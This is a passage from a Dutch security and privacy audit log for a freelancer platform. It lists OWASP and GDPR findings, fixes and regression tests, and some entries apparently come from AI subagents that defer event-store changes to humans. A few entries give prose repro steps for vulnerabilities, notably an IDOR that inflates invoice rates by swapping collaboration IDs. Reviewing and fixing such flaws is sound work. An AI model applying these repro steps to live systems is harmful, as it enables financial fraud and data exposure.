Cascade` op de kindtabel `AvailabilityWindow` vuurt niet → de vrije-tekst `note` (kan reden/medische
  details bevatten, bv. "ziek") bleef na anonimisering herleidbaar staan. Gefixt:
  `availabilityWindow.updateMany({ where: { freelancerProfile: { userId } }, data: { note: null } })`
  in de anonimiseringstransactie. Test: nieuwe case in `anonymize-erasure.test.ts` (rood→groen).

- **[HOOG · AVG art. 17 — recht op verwijdering onvolledig: Collaboration.disputeReason]** Dezelfde
  anonimisering wiste `cancellationReason` (gescopet op `cancelledById`), maar niet `disputeReason` —
  de vrije tekst die de betrokkene schreef bij het openen van een dispuut. `resolveDispute` wist 'm
  normaliter, maar bij anonimisering vóór oplossing van een open dispuut bleef hij staan. De attributie
  zit niet op de rij maar in het `DISPUTE_OPENED`-domeinevent (`actorId`); de fix verzamelt de eigen
  DISPUTE_OPENED-events en wist `disputeReason` alléén op díe samenwerkingen (nooit de reden van de
  tegenpartij). Test: nieuwe case in `anonymize-erasure.test.ts` (rood→groen). De append-only
  `DomainEvent.payload` met dezelfde tekst blijft apart geparkeerd (mens/DPO-keuze, zie 2026-06-24b).

### GEPARKEERD — privacy / AVG (ronde 2026-06-25b)

- **[MIDDEL · AVG art. 15/20 — inzage/portabiliteit onvolledig]** `buildAccountExport`
  (`src/lib/account-export.ts`) mist nog vier eigen-data-categorieën: ontvangen `Review` (waar
  `subjectId == actor`, beoordelingen ÓVER de betrokkene; alleen PUBLISHED, zonder `authorId`), eigen
  `ShiftHandoff.reason` (`requestedByUserId == actor`), `AvailabilityWindow.note` (eigen) en — bij open
  dispuut — `Collaboration.disputeReason` (waar de actor het dispuut opende). Fix: vier extra `select`-
  gescopete queries (geen derde-partij-PII).
- **[OPGELOST 2026-07-03b · AVG art. 15/20 + art. 17]** `FavoriteFreelancer.note` (privé CLIENT-notitie
  over een ZZP'er) ontbrak in zowel de export als de anonimisering. Gefixt in ronde 2026-07-03b.
- **[MIDDEL · AVG art. 5 lid 1c — dataminimalisatie]** `ProfileScreen` (`profile-screen.tsx`) selecteert
  `AvailabilityWindow.note` maar rendert die niet; onnodige verwerking van vrije-tekst-PII op het
  public-facing pad `/zzp/[id]` (server component, gaat niet naar de browser). Fix: `note` uit de select
  halen.

### GEPARKEERD — security / hardening (ronde 2026-06-25b)

- **[OPGELOST 2026-07-17 · MIDDEL · A04 — onbegrensde vrije-tekst-invoer buiten Zod (terugkerend thema)]**
  Diverse mutatie-grenzen lazen vrije tekst via `String(formData.get(...))` zonder lengtebegrenzing:
  `rejectCredential.reason` (`admin/verificaties/actions.ts`), `rejectPerformance`/`rejectInvoice`/
  `creditInvoice`/`openDispute` `.reason` + `parsePerformanceInput` `description`/`milestoneTitle`
  (`samenwerkingen/[id]/actions.ts`), en de LAAG-geparkeerde `saveApplicationNote.note` (handmatige
  `.slice(0,2000)`). Niet injecteerbaar (Prisma parametriseert, JSX escapet), maar onbegrensde payload
  belandde in PII-tabellen, notificaties én audit-metadata (bloat, defense-in-depth). Gefixt via de gedeelde
  pure `boundText`/`boundReason` (`src/lib/text-bounds.ts`, trim + kap; leeg blijft leeg → verplicht-checks
  intact): (1) boundary-normalisatie in de server-actions, (2) defense-in-depth in de pure cascade-handlers
  (`planPerformanceRejected`/`planInvoiceRejectedEvent`/`planInvoiceCreditedEvent`) plus `openDispute` en het
  best-effort e-mail-pad in de reject/credit-commands. `saveApplicationNote` gebruikt nu ook `boundReason`
  (sluit de eerder geparkeerde LAAG-`saveApplicationNote`-consistentie). Tests: `text-bounds.test.ts` (11) +
  3 rood→groen handler-cases. PR #803.
- **[MIDDEL · A01 / A05 / AVG art. 5 lid 1c — over-fetch via `include` zonder top-level `select`]**
  `administratie/openstaand/route.ts`, `admin/export/invoices/route.ts` en
  `samenwerkingen/[id]/dossier/route.ts` doen `findMany/findUnique` met `include` zonder top-level
  `select` → alle scalar-kolommen (o.a. `cancellationReason`, `disputeReason`, `cancelledById`) komen in
  het geheugen, ook al projecteert de mapping ze weg. Niet in de respons gelekt, maar regressierisico.
  Fix: top-level `select` met alleen de gebruikte velden.
- **[MIDDEL · A04 — geen rate-limit op financiële exports]** `administratie/openstaand|export|btw`-routes
  hebben geen per-gebruiker rate-limit (anders dan `/api/account/export` met `exportRateLimiter`). Fix:
  `exportRateLimiter.check(`export:${actor.id}`)` + 429.
- **[MIDDEL · A09 — audit niet-atomair bij statuswijziging]** `replyToTicket` (`support/actions.ts`)
  wijzigt ticketstatus (REOPENED/ESCALATED) in losse `await`s, niet in één `$transaction` met de audit;
  bovendien mist de audit `{ from, to }`. Spiegelt de opgeloste `adminResolve`-fix. Fix: mutatie + audit
  in één transactie, status-delta in metadata.
- **[LAAG · A09 / AVG art. 7 — misleidende audit bij upsert-no-op]** `startFiling`
  (`ontzorgd/aangifte/actions.ts`) doet `upsert` met `update: {}`; bij een bestaand record (ook
  INGEDIEND) verandert niets, maar er wordt tóch een `TAX_FILING_REQUESTED`-audit geschreven (suggereert
  hernieuwde toestemming die niet is gegeven). Fix: alleen auditen bij echte create.
- **[LAAG · A09]** `setBillingStatusAction` (`admin/facturatie/actions.ts:74`) mist `from` in de
  audit-metadata (al genoemd 2026-06-24b; lijn bevestigd).

## Ronde 2026-06-25 (basis: `main` @ d81a0aa)

Audit: orchestrator (statisch lezen + reparatie) + één parallelle security-subagent op de nieuwste
commits (#532 observability, #533 IDOR/AVG-fix, #534/#536/#537 signal-/forecast-features). Kader: OWASP
Top 10 (A01 broken access control, A05 misconfig, A09 logging) + AVG art. 5/15/17/30. Drie bevindingen
volledig gefixt (rood→groen); de rest geverifieerd en hieronder geparkeerd. De nieuwe
signal-/forecast-features (#534/#536/#537) zijn expliciet geverifieerd schoon: alle aggregaten zijn
gescopet op de eigen data van de actor of op `job.tenantId`, geen per-individu PII onder de
k-anonimiteitsdrempel, geen cross-tenant/cross-party-lek.

### OPGELOST in deze ronde

- **[HOOG · AVG art. 15/20 — inzage/portabiliteit onvolledig]** `buildAccountExport`
  (`src/lib/account-export.ts`) miste drie eigen-data-categorieën: eigen `Idea`
  (title/description/declineReason), eigen annuleerredenen (`Collaboration.cancellationReason` waar
  `cancelledById == actor`) en `PushSubscription` (endpoint = persistente toestel-/browser-identifier).
  Repro: `GET /api/account/export` → betrokkene kreeg een onvolledige inzage (art. 15-tekortkoming).
  Gefixt: drie extra `findMany`'s met strikte `select` (annuleerreden gescopet op `cancelledById`, geen
  `companyId/freelancerId`; push zonder cryptografische secrets `p256dh/auth`). Geschonden: CLAUDE.md
  regel 1 (server-side waarheid), AVG art. 15/20. Test: `src/lib/account-export.test.ts` (2 nieuwe
  cases, rood→groen).

- **[MIDDEL · AVG art. 5 lid 1c — dataminimalisatie]** Diezelfde export deed
  `db.company.findUnique({ where })` **zonder `select`** → interne velden (`tenantId`, `logoKey`,
  `userId`) lekten mee in de inzage-JSON. Gefixt: expliciete `select` (alleen
  name/industryId/description/website/location/timestamps). Test: nieuwe case in
  `account-export.test.ts` assert dat `tenantId`/`logoKey` afwezig zijn in de select (rood→groen).

- **[MIDDEL · A09 / AVG art. 30 — auditplicht]** `GET /api/admin/facturatie/[id]/pdf` serveerde een
  platformfactuur-PDF (financiële PII: bedrijfsnaam, bedragen) **zonder auditregel**, anders dan
  `/api/facturen/[id]/pdf` e.a. Geschonden: CLAUDE.md regel 5 ("audit alles wat telt — documenttoegang").
  Gefixt: `PLATFORM_BILLING_PDF_ACCESSED`-audit (met IP/UA via `requestMeta`) ná de admin-rolcheck +
  NL-label in `audit-labels.ts`. Test: `src/app/api/admin/facturatie/[id]/pdf/route.test.ts`
  (geautoriseerd → audit; niet-admin → 403 + geen serve/audit; rood→groen).

- **[HOOG · A05 — security-/availability-misconfig]** `/api/readiness` stond niet in de inlogvrije
  allowlist (`isPublicPath`), terwijl de middleware-matcher het pad wél raakt → een
  Railway/monitoring-readinessprobe werd naar `/login` geredirect (302) i.p.v. 200/503 JSON, en
  rapporteerde permanent falen (kans op onnodige restarts/geblokkeerde deploys). Repro: anonieme
  `GET /api/readiness` → 302 naar `/login`. Gefixt: `isPublicPath` verplaatst naar het pure, geteste
  `src/lib/route-guards.ts` en `/api/readiness` toegevoegd (lekt alleen booleans + 7-tekens commit-SHA,
  net als `/api/health`). Test: `src/lib/route-guards.test.ts` (health+readiness publiek; beschermde
  routes niet; rood→groen).

### GEPARKEERD — security / privacy (ronde 2026-06-25)

- **[MIDDEL · AVG art. 5 lid 1f — PII-lek via Sentry]** `SentryErrorReporter.capture()`
  (`src/lib/observability/report.ts`) geeft het rauwe `Error`-object door aan `sentry.captureException`
  **buiten** de logger-`redact()`/`maskEmails()`-pijplijn. Latent: `@sentry/nextjs` is nog niet
  geïnstalleerd (fallback = `ConsoleErrorReporter` via de gemaskeerde logger), maar het lekt zodra het
  pakket + `SENTRY_DSN` live gaan (bv. een Prisma-/Zod-fout met e-mail in `.message`). Fix: vóór
  `captureException` `describeError()` draaien en alleen `{ name, message: maskEmail(...), stack:
maskEmail(...) }` als `extra` doorgeven. **MENSENWERK: fix vóór Sentry in productie wordt ingeschakeld.**
- **[MIDDEL · AVG art. 5 lid 1f — PII/fout in serverlogs zonder logger]** Vier call-sites loggen via rauwe
  `console.error` i.p.v. de nieuwe gestructureerde logger (geen `redact()`/email-masking):
  `admin/gebruikers/actions.ts:168` (storage-opruimfout, rauw `err`), `documenten/actions.ts:99`,
  `certificaten/actions.ts:73` en — het ergst — `admin/import/actions.ts:298` (logt `row.email`
  rechtstreeks). Fix: vervang door `logger.error(..., { error: describeError(err) })`; voor import het
  e-mailadres weglaten (gebruik `user.id`).
- **[LAAG · logger over-redactie]** `REDACT_KEY_SUBSTRINGS` bevat de brede substring `"auth"`
  (`src/lib/observability/logger.ts:27`) → maskeert ook `authorId`/`author` in debug-logs, wat
  audit-correlatie kan vertroebelen. Geen security-gat (over-redactie). Fix: vervang door specifiekere
  sleutels (`authorization` blijft).

## Ronde 2026-06-24b (basis: `main` @ 5229656)

Audit: 4 parallelle security/privacy-subagents (API route-handlers, franchise-/admin-tenant-isolatie,
non-admin server actions, AVG/anonimisering). OWASP Top 10 (A01 broken access control, A09 logging) +
AVG art. 5/15/17/30 als kader. Twee top-bevindingen volledig gefixt (rood→groen), de rest geverifieerd
en hieronder geparkeerd met repro + severity.

### OPGELOST in deze ronde

- **[HOOG · A01 — IDOR / financiële manipulatie]** `editAndResubmitPerformanceAction`
  (`samenwerkingen/[id]/actions.ts`) kreeg twee onafhankelijke client-id's: `performanceId` (waarop
  ownership werd gecheckt) én `collaborationId` (waaruit `parsePerformanceInput` het uurtarief/ORT
  snapshot). De twee werden NIET aan elkaar gebonden; `updatePerformance` schreef het meegestuurde
  `rateCents` weg zonder te verifiëren dat de samenwerking bij de prestatie hoort. Repro: een ZZP'er
  met twee samenwerkingen (bv. €40 en €80) corrigeert een afgekeurde prestatie op de €40-samenwerking
  met `collaborationId` van de €80-samenwerking → de prestatie krijgt €80/u; na het grace-venster
  auto-goedgekeurd → opgeblazen factuur. Tevens werd andermans tarief leesbaar op de eigen prestatie.
  Geschonden: CLAUDE.md regel 1 (server-side waarheid) & 2 (ownership vóór actie); OWASP A01. Gefixt:
  de actie laadt nu de eigen `collaborationId` + eigenaar van de prestatie, weigert een afwijkend
  `collaborationId` en gebruikt de eigen samenwerking als tarief-bron. Test:
  `src/app/(protected)/samenwerkingen/[id]/edit-resubmit-authz.test.ts` (rood→groen: mismatch →
  geweigerd, geen `updatePerformance`; niet-eigenaar → geweigerd; eigen+match → door).

- **[KRITIEK · AVG art. 17 — recht op verwijdering onvolledig]** `anonymizeUser()`
  (`admin/gebruikers/actions.ts`) redacteerde de eerder gevonden vrije-tekstvelden, maar liet nog
  herleidbare/persoonsgebonden data van de betrokkene achter (een `user.update` triggert geen cascade
  op kindrijen): `IndirectHoursEntry.note` (vrije tekst), eigen `Idea.title/description`,
  `Collaboration.cancellationReason` (waar `cancelledById == userId`) en — het ergst — alle
  `PushSubscription`-rijen (`endpoint` is een persistente toestel-/browser-identifier). Gefixt: vier
  extra mutaties in dezelfde anonimiseringstransactie (note→null, idee-titel/omschrijving geredact,
  eigen annuleerreden→null, push-abonnementen `deleteMany`). Test:
  `anonymize-erasure.test.ts` (4 nieuwe cases, rood→groen).

### GEPARKEERD — privacy/AVG (ronde 2026-06-24b)

- **[HOOG · AVG art. 17 — dispuut-`reason` (vrije tekst) overleeft erasure op DRIE plekken]**
  `DISPUTE_OPENED` bewaart de vrije-tekst `reason` in de append-only event-store
  (`DomainEvent.payload`, `dispute-commands.ts:48`); structureel niet te wissen bij anonimisering.
  **Uitgebreid (2e ronde 2026-07-08, subagent-verificatie):** dezelfde ruwe `reason`-tekst wordt óók
  gekopieerd naar (a) `Notification.body` van admins (`dispute-commands.ts:67`) — `anonymizeUser` muteert
  `Notification` in het geheel niet en deze rijen horen bij de ontvanger (admin), niet de actor; en
  (b) `AuditLog.metadata.reason` (`dispute-commands.ts:78`) — buiten het bereik van
  `scrubAuditMetadataPii`, dat alleen hele veldwaarden exact matcht op naam/e-mail, nooit een naam áls
  substring in een vrije zin. `Collaboration.disputeReason` zélf wordt wél genulld, wat een vals gevoel
  van "weg" geeft. **Mens/DPO-keuze vereist**: pseudonimiseren/redigeren óf de event-store + admin-
  notificaties expliciet classificeren onder art. 17 lid 3 (archief/rechtsvordering) én een
  retentie-opruimtaak toevoegen (die er voor geen van de drie tabellen is). MENSENWERK — geen stille
  agent-fix op de event-store.
- **[HOOG · AVG art. 15/20 — export onvolledig] — OPGELOST (ronde 2026-06-25)** `buildAccountExport`
  (`src/lib/account-export.ts`) miste de eigen `Idea` (title/description), `Collaboration.cancellationReason`
  (eigen) en `PushSubscription`. Toegevoegd met strikte `select` (zie ronde 2026-06-25 boven).
- **[MIDDEL · AVG art. 30]** `PushSubscription`, `IndirectHoursEntry` (urencriterium, 7 jr fiscaal) en
  `HealthIncident` (bevat klartekst-IP in `summary`, `monitoring/detectors.ts`) ontbreken in
  `processing-register.ts`. Fix: register-entries + bewaartermijn/opruimtaak.
- **[MIDDEL · k-anonimiteit testdrempel] — OPGELOST (2e ronde 2026-07-08)** `market-rate.test.ts`
  gebruikte een lokale `MIN = 3` i.p.v. `MARKET_RATE_MIN_SAMPLE` (=10) uit `config.ts`; een per ongeluk
  verlaagde productiedrempel werd niet gedetecteerd. Gefixt: nieuwe `describe`-block importeert de echte
  constante en assert `>= 10` (rood→groen). Zie de OPGELOST-entry bovenaan (2e ronde 2026-07-08).
- **[MIDDEL · AVG art. 5 lid 1f — storageKey in hosting-logs]** mislukte storage-opruiming logt de
  `storageKey` (`admin/gebruikers/actions.ts`, `documenten/actions.ts`, `certificaten/actions.ts`)
  naar `console.error` zonder `NODE_ENV`-guard. Fix: in productie de key maskeren of naar een
  beveiligde audittabel schrijven i.p.v. de console.
- **[MIDDEL · AVG art. 15/20] — OPGELOST (ronde 2026-06-25)** `db.company.findUnique` in de export had
  geen `select` → interne velden (`tenantId`, `logoKey`) lekten mee. Gefixt met expliciete `select`.

### GEPARKEERD — security / hardening (ronde 2026-06-24b)

- **[MIDDEL · A09 — audit-volledigheid] — OPGELOST (ronde 2026-06-25)** `/api/admin/facturatie/[id]/pdf`
  serveerde een platform-factuur-PDF (financiële PII) zonder auditregel. Gefixt met
  `PLATFORM_BILLING_PDF_ACCESSED`-audit (zie ronde 2026-06-25 boven).
- **[MIDDEL · CLAUDE.md regel 2 — Zod-grens]** `saveApplicationNote` (`kandidaten/actions.ts`) schrijft
  het `note`-veld via `String().slice(2000)` i.p.v. een Zod-schema. Niet injecteerbaar (Prisma
  parametriseert), maar buiten de gevalideerde grens. Fix: `z.string().trim().max(2000)`.
- **[MIDDEL · A04 — error-leak]** `activate` (`abonnement/actions.ts`) gebruikt `planKeySchema.parse`
  → rauwe `ZodError` (met geldige enum-waarden) naar de boundary. Fix: `safeParse` + nette fout.
- **[LAAG · A09 — audit-volledigheid]** audit niet-atomair met de statuswijziging in
  `setBillingStatusAction` (`from` ontbreekt in metadata), `adminResolve` (support) en
  `setDienstStatus` (franchise); statusguard ís aanwezig (geen TOCTOU). Fix: mutatie + auditLog in één
  `$transaction`; `{ from, to }` in metadata.
- **[LAAG · A09 — orphaned storage]** mislukte storage-delete bij `deleteDocument`/`deleteDocumentById`
  /logo-upload markeert geen `storageOrphaned` in de audit → onzichtbaar verweesd S3-object. Fix:
  `metadata: { storageOrphaned: true, key }` bij de `.catch`.
- **[LAAG · A05 — CSP-sandbox]** `/api/media/[...key]` zet geen `Content-Security-Policy: sandbox` op
  een (theoretisch) als logo opgeslagen PDF, anders dan `/api/documents/[id]`. Fix: sandbox-header bij
  `application/pdf`.
- **[LAAG · A09]** `/api/agenda` (.ics-export van alle actieve samenwerkingen) schrijft geen
  auditregel, anders dan de overige bulk-exports. Fix: `AGENDA_EXPORTED`-audit.
- **[LAAG · CLAUDE.md regel 3]** `setUserStatus` kent geen expliciete `USER_STATUS_TRANSITIONS`-map
  (ACTIVE→PENDING mogelijk). Fix: transitiemap toevoegen.

## Ronde 2026-06-24 (basis: `main` @ 70cf3b6)

Audit: 4 parallelle security/privacy-subagents over server actions, franchise-/admin-actions,
API route-handlers en AVG/anonimisering, plus handmatige verificatie van auth/sessie, deeltoken,
wachtwoordherstel, cron-auth en storage. OWASP Top 10 (A01 broken access control, A04 insecure
design, A07 auth failures, A09 logging) + AVG art. 5/15/17/30 als kader.

### OPGELOST in deze ronde

- **[HOOG · A09 / AVG art. 30 — accountability]** Drie on-demand PDF-routes serveerden gevoelige
  PII-documenten **zonder auditregel**, in tegenstelling tot de dossier-routes en
  `/api/documents/[id]`. Geschonden: CLAUDE.md regel 5 ("audit alles wat telt — documenttoegang").
  Gefixt: `audit()` (met IP/UA via `requestMeta`) toegevoegd ná de ownership-check in
  `src/app/api/facturen/[id]/pdf/route.ts` (`INVOICE_PDF_ACCESSED`),
  `src/app/api/prestaties/[id]/pdf/route.ts` (`PERFORMANCE_PDF_ACCESSED`) en
  `src/app/api/samenwerkingen/[id]/modelovereenkomst/route.ts` (`MODEL_AGREEMENT_ACCESSED`).
  NL-labels in `src/lib/audit-labels.ts`. Test: `src/app/api/pdf-routes-audit.test.ts` (rood→groen:
  geautoriseerd → auditregel; niet-partij → 403 + geen audit/serve).

- **[KRITIEK · AVG art. 17 — recht op verwijdering]** `anonymizeUser()` overschreef de PII op
  `User`/`FreelancerProfile`/`Company` en wiste `Credential`/`Document`/`Message`, maar liet
  herleidbare vrije-tekst-PII van de betrokkene achter in kindrijen (een `user.update` triggert geen
  cascade). Geschonden: CLAUDE.md "documenten/PII echt verwijderen", AVG art. 17. Gefixt: de
  anonimiseringstransactie in `src/app/(protected)/admin/gebruikers/actions.ts` redact nu ook
  `Application.motivation`, `SupportMessage.body` (eigen), `IdeaComment.body` (eigen),
  `Review.comment` (eigen) en `ShiftHandoff.reason` (eigen). Test:
  `src/app/(protected)/admin/gebruikers/anonymize-erasure.test.ts` (rood→groen).

### GEPARKEERD — privacy/AVG

- **[HOOG · AVG art. 30 — Lead-PII zonder grondslag/bewaartermijn]** Het `Lead`-model bewaart PII
  van derden (prospects): `contactName`, `email`, `phone`, `notes`, `LeadContact.body`. Ontbreekt
  volledig in `src/lib/compliance/processing-register.ts` (geen verwerkingsactiviteit, geen
  `RetentionRule`). Repro: `/franchise/leads` → lead aanmaken → PII blijft onbeperkt staan.
  Fix: registerentry "Acquisitie-/leadbeheer franchise" (grondslag GERECHTVAARDIGD_BELANG),
  bewaartermijn (bv. 12 mnd na `NO_DEAL`/laatste activiteit) + opruimtaak of MENSENWERK-notitie.
  **Mens bevestigen vóór livegang** (mogelijke art. 6-overtreding bij echte data).

- **[HOOG · AVG art. 5 lid 1f — PII in serverlogs]**
  `src/app/(protected)/admin/import/actions.ts` (welkomstmail-fout) logt `row.email` in
  `console.error` zonder `NODE_ENV`-guard; host-/Railway-logs vallen buiten de auditdatabase.
  Fix: vervang door een niet-herleidbare `user.id` (CUID) i.p.v. het e-mailadres.

- **[HOOG · AVG art. 30 — transparantie auditmetadata]** E-mailadressen (ook van niet-leden) worden
  in `AuditLog.metadata` opgeslagen bij `AUTH_RATE_LIMITED`/`USER_LOGIN_FAILED` (`src/auth.ts`),
  `REGISTER_RATE_LIMITED` (`src/app/register/actions.ts`) en `USER_IMPORTED`
  (`admin/import/actions.ts`) en geëxporteerd via de admin-audit-CSV, maar niet vermeld in de
  `dataCategories` van de beveiligings-entry in `processing-register.ts`. Fix: dataCategorie
  documenteren (gerechtvaardigd beveiligingsbelang) en heroverwegen of het e-mailadres bij een
  bekende `userId` nodig is.

- **[MIDDEL · AVG art. 15/20 — inzage/portabiliteit onvolledig] — OPGELOST (#527)**
  `GET /api/account/export` bevatte alleen `sentMessages`. Toegevoegd: ontvangen berichten,
  `TaxFilingRequest`, eigen `Review`, `IdeaComment`, eigen `SupportTicket`/`SupportMessage`,
  `IndirectHoursEntry`. Dataverzameling verhuisd naar de testbare, gedeelde
  `src/lib/account-export.ts` (`buildAccountExport`) met strikte `select`-clauses (geen
  vrije-tekst-PII van derden): ontvangen berichten zijn gescopet op gesprekken waarin de actor
  deelneemt (`senderId != actor`), ondersteuningsberichten op `authorId == actor` (geen
  admin-/assistent-antwoorden), en de eigen `Review` laat `subjectId` weg (geen identiteit van de
  beoordeelde tegenpartij). Test: `src/lib/account-export.test.ts` (5 tests).

- **[MIDDEL · AVG art. 5 lid 1c — dataminimalisatie]** KvK-nummer staat op het publieke profiel
  (`src/components/profile/profile-screen.tsx`), zichtbaar voor anonieme bezoekers op `/zzp/[id]`;
  voor een eenmanszaak herleidbaar tot woonadres via het KvK-register. Fix: KvK alleen tonen aan
  eigenaar/admin/actieve-samenwerking-CLIENT, of een duidelijke uitleg bij het veld.

- **[MIDDEL · AVG art. 13/46 — doorgifte aan derde]** Bij `ROUTING_PROVIDER=geoapify` gaan
  locatiestrings (profiel/opdracht) naar Geoapify (`src/lib/services/routing.ts`) en wordt de query
  in `GeocodeCache.query` bewaard; geen verwerker-entry. Fix: registerentry "Reistijdberekening" +
  MENSENWERK-notitie (verwerkersovereenkomst + EU-regio vereist vóór activering).

- **[LAAG · AVG art. 30]** `TaxFilingRequest` (machtigingen DigiD/eHerkenning, `partnerName`,
  bedragen) ontbreekt in het verwerkingsregister. Fix: entry "Belastingaangifte-delegatie"
  (grondslag TOESTEMMING, bewaartermijn 7 jaar fiscaal).

### GEPARKEERD — security / hardening

- **[HOOG · A09 — error-leak] — OPGELOST (#528)** `src/app/api/tasks/run-all/route.ts` zette rauwe
  `e.message` (mogelijk Prisma-schema-detail) in de JSON-respons. Gefixt: nieuwe pure
  `src/lib/scheduled-tasks.ts` (`runScheduledTasks(tasks, logError?)`) zet de statische string
  `"Taak mislukt."` in `errors[name]` en geeft het echte foutobject via `logError` door; de route
  logt dat **alleen server-side** (`console.error`). Test: `src/lib/scheduled-tasks.test.ts`
  (maskering + geen lek van de ruwe boodschap).

- **[MIDDEL · A04 — resource exhaustion]** `src/app/api/push/subscribe/route.ts` heeft geen
  per-gebruiker rate-limit; een ingelogde gebruiker kan veel push-endpoints registreren. Fix:
  `exportRateLimiter`-patroon toepassen (bv. 20/u).

- **[MIDDEL · datameintegriteit] — OPGELOST (#523)** `noShowReportSchema` (`src/lib/validation.ts`)
  accepteerde een `occurredOn` in de toekomst; een no-show kon vooraf op een ZZP'er worden geboekt
  (telt mee in de schorsingsladder). Gefixt: `.refine(d => d.getTime() <= Date.now(), …)` op het
  schema (server-side, beide melders). Test: `validation.test.ts` (verleden/vandaag toegestaan,
  toekomst geweigerd).

- **[MIDDEL · datameintegriteit] — OPGELOST (#523)** `setOrtProfileAction`
  (`samenwerkingen/[id]/actions.ts`) had geen bovengrens op de maatwerk-ORT-percentages (alleen
  `>= 0`); de eigenaar-CLIENT kon absurde toeslagen instellen die in alle toekomstige facturen
  doorwerken. Gefixt: `MAX_ORT_CUSTOM_BPS = 50000` (+500%) in `config.ts`; harde guard in de actie
  bij het schrijven én een defense-in-depth grens in `parseOrtCustomRates` (`ort.ts`) bij het lezen
  (legacy/bewerkte rijen vallen terug op het sectorprofiel). Test: `ort.test.ts`.

- **[MIDDEL · A09 — audit-volledigheid] — OPGELOST (#528)** `adminReply`
  (`admin/support/actions.ts`) wijzigde ticketstatus + `assignedToId` zonder dat in de auditregel op
  te nemen en zonder transactie rond de mutaties. Gefixt: de vier mutaties in één
  `prisma.$transaction`; `{ statusChanged, assignedTo }` in de `SUPPORT_AGENT_REPLY`-metadata. Test:
  `admin-reply.test.ts`.

- **[MIDDEL · A04 — mass-assignment defense-in-depth] — OPGELOST (#528)** `commitImport`
  (`admin/import/actions.ts`) vertrouwde op het TypeScript-type `ImportRole` voor de rol bij
  `user.create`; geen runtime-guard. Gefixt: `assertImportRole` (`src/lib/import-role.ts`,
  `z.enum(["FREELANCER","CLIENT"])`) vlak vóór de DB-write, binnen de bestaande per-rij-try. Test:
  `import-role.test.ts`.

- **[LAAG · defense-in-depth IDOR] — OPGELOST (ronde 2026-08-24):** `deleteDocumentById`
  (`certificaten/actions.ts`) deed geen eigen ownership-check (vertrouwde op de aanroepers die een eigen
  credential-document doorgeven). De functie selecteert nu `ownerId` en faalt fail-closed bij
  `doc.ownerId !== actorId` (`DOCUMENT_DELETE_DENIED`-audit, niets verwijderd). Regressietest:
  `certificaten/delete-owner-guard.test.ts` (rood→groen bevestigd). Zie de 2026-08-24-ronde bovenaan.

- **[LAAG · audit-volledigheid]** `removeDepartment`/`removeAfdelingStep` (franchise) auditen geen
  count van geraakte `Job.departmentId`-cascades. Fix: `affectedJobIds` in metadata.

- **[LAAG · consistentie]** `setUserStatus` (`admin/gebruikers/actions.ts`) gebruikt
  `userStatusSchema.parse` (throwt 500) i.p.v. `safeParse` + nette fout.

### BEKEKEN — geen kwetsbaarheid (vals positief)

- **Billing-webhook ontbeert HMAC-handtekening** (`api/billing/webhook/route.ts`) — gemeld als
  KRITIEK, maar **niet exploiteerbaar**: Mollie ondertekent payment-webhooks niet; de route haalt de
  status autoritatief opnieuw op bij Mollie met de eigen API-key (de re-fetch ÍS de control, conform
  Mollie-docs). Onder de Noop-provider (dev) hebben abonnementen `providerRef = null`, dus de
  `findFirst({ where: { providerRef } })` matcht nooit. Geen HMAC nodig; niet aangepast.
- **CSV-formula-injectie in exports** — `escapeCsvField` (`src/lib/csv.ts`) dekt `= + - @` correct;
  alle exports lopen via `toCsv`. Schoon.
- **Cron-auth, deeltoken, wachtwoordherstel, document-/media-serving, tenant-isolatie** (franchise/
  admin-actions) — geverifieerd correct (timing-safe vergelijkingen, ownership/`assertSameTenant`,
  geen informatielek). Schoon.
